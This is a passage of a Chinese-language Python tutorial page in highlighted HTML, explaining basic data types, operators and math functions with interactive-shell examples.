prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[:-<span class="hljs-number">5</span>])</span><br>strin<br></code></pre></td></tr></table></figure><p>加号 + 字符连接符</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a + <span class="hljs-string">&quot;20241112&quot;</span>)</span><br>stringtest20241112<br></code></pre></td></tr></table></figure><p>星号 ***** 表示复制当前字符串，与之结合的数字为复制的次数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a * <span class="hljs-number">2</span>)</span><br>stringteststringtest<br></code></pre></td></tr></table></figure><p>反斜杠 \ 转义特殊字符，字符串前加r，反斜杠不再转义，显示原始字符串</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;te\nst&quot;</span>)</span><br>te<br>st<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">r&quot;te\nst&quot;</span>)</span><br>te\nst<br></code></pre></td></tr></table></figure><p>注意</p><p>1、没有单独的字符类型，一个字符就是长度为1的字符串</p><p>2、反斜杠可以用来转义，使用r可以让反斜杠不发生转义</p><p>3、字符串可以用+运算符连接在一起，用*运算符重复</p><p>4、字符串有两种索引方式，从左往右以0开始，从右往左以-1开始</p><p>5、字符串不能改变</p><p>a[1] &#x3D; 1 会报错</p><h5 id="Tuple元组"><a href="#Tuple元组" class="headerlink" title="Tuple元组"></a>Tuple元组</h5><p>圆括号()标识，逗号,分隔元素，元素不可二次赋值，相当于不可变列表</p><p>元素类型可以不相同</p><p>元组名(开始下标:结束下标)</p><p>开始下标从0开始</p><p>空元组 ()</p><p>单元素元组，元素后需要逗号， (1,)</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tupletest = (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">2.1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tupletest[<span class="hljs-number">1</span>])</span><br>test<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tupletest[<span class="hljs-number">0</span>])</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tupletest[<span class="hljs-number">2</span>])</span><br>2.1<br></code></pre></td></tr></table></figure><p>给元组元素二次赋值会报错</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; tupletest<span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">2</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;python-input-8&gt;&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    tupletest<span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">2</span><br>    ~~~~~~~~~^^^<br>TypeError: <span class="hljs-string">&#x27;tuple&#x27;</span> <span class="hljs-selector-tag">object</span> does not support item assignment<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><h5 id="bytes类型"><a href="#bytes类型" class="headerlink" title="bytes类型"></a>bytes类型</h5><p>1、不可变的二进制序列（byte sequence）</p><p>2、元素是整数值（0 到 255 之间的整数），例如：字符a存储的是97，而不是 Unicode 字符</p><p>3、常使用 b 前缀创建</p><p>4、常用于处理二进制数据，比如图像文件、音频文件、视频文件等等</p><p>网络编程中常使用 bytes 类型来传输二进制数据</p><p>5、bytes()函数将其他对象转换为bytes类型</p><p>​y &#x3D; bytes(x,encoding&#x3D;”utf-8”)</p><p>​x参数为需要转换的对象</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">test = <span class="hljs-string">&quot;hello&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(test, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))</span><br>b&#x27;hello&#x27;<br></code></pre></td></tr></table></figure><p>6、bytes类型支持切片、拼接、查找等操作，因为是不可变类型，操作需要创建新的变量</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&gt;&gt;&gt; aa = b<span class="hljs-string">&#x27;testaa&#x27;</span><br>&gt;&gt;&gt; print(type(aa))<br>&lt;<span class="hljs-keyword">class</span> &#x27;<span class="hljs-symbol">bytes</span>&#x27;&gt;<br>&gt;&gt;&gt; <span class="hljs-symbol">cc</span> = <span class="hljs-symbol">aa</span>[<span class="hljs-symbol">1:<span class="hljs-symbol">3</span></span>]<br>&gt;&gt;&gt; <span class="hljs-symbol">print</span>(<span class="hljs-symbol">cc</span>)<br><span class="hljs-symbol">b</span>&#x27;<span class="hljs-symbol">es</span>&#x27;<br>&gt;&gt;&gt; <span class="hljs-symbol">dd</span> = <span class="hljs-symbol">cc</span> + <span class="hljs-symbol">aa</span><br>&gt;&gt;&gt; <span class="hljs-symbol">print</span>(<span class="hljs-symbol">dd</span>)<br><span class="hljs-symbol">b</span>&#x27;<span class="hljs-symbol">estestaa</span>&#x27;<br></code></pre></td></tr></table></figure><p>7、由于bytes变量中存储的是整数，所以对比的时候需要将字符转换为整数，使用ord()函数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> aa[<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;e&#x27;</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    </span><br>OK<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> aa[<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;i&#x27;</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    </span><br>NO<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="可变数据"><a href="#可变数据" class="headerlink" title="可变数据"></a>可变数据</h4><h5 id="List列表"><a href="#List列表" class="headerlink" title="List列表"></a>List列表</h5><p>列表值支持数字、字符串、列表</p><p>方括号[]标识，逗号分隔的元素列表</p><p>可以通过下标索引分隔列表，返回新的列表</p><p>列表名[开始下标:结束下标]</p><p>索引键从0开始，结尾从-1开始</p><p>注意：</p><p>加号 + 列表连接符</p><p>星号 * 列表重复符</p><p>支持第三个参数，按步长获取数据，2是跨1个字符读取</p><h5 id="Dictionary字典"><a href="#Dictionary字典" class="headerlink" title="Dictionary字典"></a>Dictionary字典</h5><p>大括号{}标识</p><p>key 和 value 组成 </p><p>同一字典，key必须唯一</p><p>创建空字典使用{}</p><p>可变数据类型，元素可以二次赋值</p><p>dicttest &#x3D; {‘key’:’value’}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>dicttest = &#123;<span class="hljs-string">&quot;key1&quot;</span>:<span class="hljs-string">&quot;value1&quot;</span>, <span class="hljs-string">&quot;key2&quot;</span>:<span class="hljs-string">&quot;value2&quot;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(dicttest)<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>dicttest[‘key’]&#x3D;”value”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>dicttest[<span class="hljs-string">&#x27;key1&#x27;</span>]=<span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(dicttest)<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h6 id="Dictionary与List对比"><a href="#Dictionary与List对比" class="headerlink" title="Dictionary与List对比"></a>Dictionary与List对比</h6><p>List 有序的对象集合</p><p>Dictionary 无序的对象集合</p><h5 id="Set集合"><a href="#Set集合" class="headerlink" title="Set集合"></a>Set集合</h5><p>无序、可变的数据类型，用于存储唯一的元素</p><p>元素不可重复</p><p>可进行交集、并集、差集等常见的集合操作</p><p>大括号{}标识，逗号,分隔元素</p><p>set()函数创建或{value1,value2…}创建</p><p>空集合必须使用set()创建，不可以用{}创建，{}是创建空字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>aaa = &#123;&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(&#123;&#125;))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>ccc = <span class="hljs-built_in">set</span>()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(ccc))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h1><h2 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h2><h2 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h2><p>‘’’  ‘’’</p><p>“””   “””</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><ul><li></li></ul><ul><li></li></ul><ul><li></li></ul><p>&#x2F;</p><p>% 取模，返回除法的余数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">22</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x % y</span><br>0<br></code></pre></td></tr></table></figure><p>** 幂  x**y 返回 x 的y次方</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">22</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x**z</span><br>484<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F; 取整除 - 往小的方向取整数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz = <span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz//z</span><br>5<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cc = -<span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cc // z</span><br>-6<br></code></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>返回bool值True或False</p><p>&#x3D;&#x3D; 等于</p><p>!&#x3D; 不等于</p><p>&gt; 大于</p><p>&lt; 小于</p><p>&gt;&#x3D; 大于等于</p><p>&lt;&#x3D; 小于等于</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>&#x3D; 赋值</p><p>+&#x3D; 加法赋值运算符</p><p>​a +&#x3D; b 等价 a &#x3D; a+b</p><p>-&#x3D; 减法赋值运算符</p><p>*&#x3D; 乘法赋值运算符</p><p>&#x2F;&#x3D; 除法赋值运算符</p><p>%&#x3D; 取模赋值运算符</p><p>**&#x3D; 幂赋值运算符</p><p>&#x2F;&#x2F;&#x3D; 取整除赋值运算符</p><p>:&#x3D; 海象运算符</p><p>​表达式中同时进行赋值和返回赋值的值</p><p>​    a :&#x3D; 10，表示将10赋值给a，并返回a</p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><h3 id="and"><a href="#and" class="headerlink" title="and"></a>and</h3><p>布尔与</p><p>x and y，如果 x 为 false，则返回x，否则返回y</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">and</span> y</span><br>0<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">and</span> y</span><br>1<br></code></pre></td></tr></table></figure><h3 id="or"><a href="#or" class="headerlink" title="or"></a>or</h3><p>布尔或</p><p>x or y，如果 x 为 True，返回 x；否则返回 y</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">or</span> y</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">or</span> y</span><br>11<br></code></pre></td></tr></table></figure><h3 id="not"><a href="#not" class="headerlink" title="not"></a>not</h3><p>布尔非</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">not</span> x</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">not</span> x</span><br>True<br></code></pre></td></tr></table></figure><h2 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h2><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>在搜索序列中找到，返回True；没有找到，返回False</p><h3 id="not-in"><a href="#not-in" class="headerlink" title="not in"></a>not in</h3><p>在搜索序列中没有找到，返回True；找到，返回False</p><h2 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h2><p>用于比较两个对象的存储单元，也就是内存地址，而不是值</p><h3 id="is"><a href="#is" class="headerlink" title="is"></a>is</h3><p>x is y 等价 id(x) is id(y)</p><p>相同返回True；否则返回False</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(x <span class="hljs-keyword">is</span> y)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(z <span class="hljs-keyword">is</span> y)</span><br>False<br></code></pre></td></tr></table></figure><p>id()函数用于获取对象内存地址</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(x)</span><br>4386204320<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(y)</span><br>4386204320<br></code></pre></td></tr></table></figure><h3 id="is-not"><a href="#is-not" class="headerlink" title="is not"></a>is not</h3><p>相同返回False，不同返回True</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(x <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> y)</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(x <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> z)</span><br>True<br></code></pre></td></tr></table></figure><h1 id="数字Number类型"><a href="#数字Number类型" class="headerlink" title="数字Number类型"></a>数字Number类型</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>varname &#x3D; varvalue</p><p>存储数值，为不可变数据类型，如果修改值，将重新分配内存空间</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(x)</span><br>4386204320<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(x)</span><br>4386204352<br></code></pre></td></tr></table></figure><h2 id="删除定义"><a href="#删除定义" class="headerlink" title="删除定义"></a>删除定义</h2><p>del varname</p><p>del varname1, varname2</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-selector-tag">del</span>  <span class="hljs-attribute">x</span><br>&gt;&gt;&gt; <span class="hljs-built_in">id</span>(<span class="hljs-attribute">x</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;python-input-214&gt;&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-built_in">id</span>(<span class="hljs-attribute">x</span>)<br>       ^<br>NameError: name <span class="hljs-string">&#x27;x&#x27;</span> is not defined<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前必须定义</p><h2 id="数字函数"><a href="#数字函数" class="headerlink" title="数字函数"></a>数字函数</h2><h3 id="abs-x"><a href="#abs-x" class="headerlink" title="abs(x)"></a>abs(x)</h3><p>返回数字的绝对值</p><h3 id="ceil-x"><a href="#ceil-x" class="headerlink" title="ceil(x)"></a>ceil(x)</h3><p>返回数字的向上取整值</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> math</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1.1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.ceil(x)</span><br>2<br></code></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>返回e的x次幂</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">&gt;&gt;&gt; <span class="hljs-built_in">math</span>.<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>)<br><span class="hljs-number">2.718281828459045</span><br>&gt;&gt;&gt; <span class="hljs-built_in">math</span>.<span class="hljs-built_in">exp</span>(<span class="hljs-number">0</span>)<br><span class="hljs-number">1.0</span><br></code></pre></td></tr></table></figure><h3 id="fabs-x"><a href="#fabs-x" class="headerlink" title="fabs(x)"></a>fabs(x)</h3><p>返回以浮点数值形式的绝对值</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = -<span class="hljs-number">1.2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.fabs(a)</span><br>1.2<br></code></pre></td></tr></table></figure><h3 id="floor-x"><a href="#floor-x" class="headerlink" title="floor(x)"></a>floor(x)</h3><p>返回向下取整的值</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = -<span class="hljs-number">1.2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.floor(a)</span><br>-2<br></code></pre></td></tr></table></figure><h3 id="long-x"><a href="#long-x" class="headerlink" title="long(x)"></a>long(x)</h3><p>返回x的自然对数，x&gt;0</p><p>需要导入math模块</p><p>静态对象调用</p><h3 id="max-x"><a href="#max-x" class="headerlink" title="max(x)"></a>max(x)</h3><p>返回给定参数的最大值，参数可以为序列，也就是list\tuple\ditc等</p><p>比对规则，按索引顺序，逐个对比索引对应值的大小，直到遇见最大值，结束比对，返回最大值所在序列</p><p>给定参数的类型数值类型可以混用，序列类型不可混用，数值类型和序列类型混用会报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&gt;&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">max</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File &quot;&lt;python-input-249&gt;&quot;, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">module</span><span class="hljs-operator">&gt;</span><br>    <span class="hljs-built_in">max</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>    <span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><br>TypeError: <span 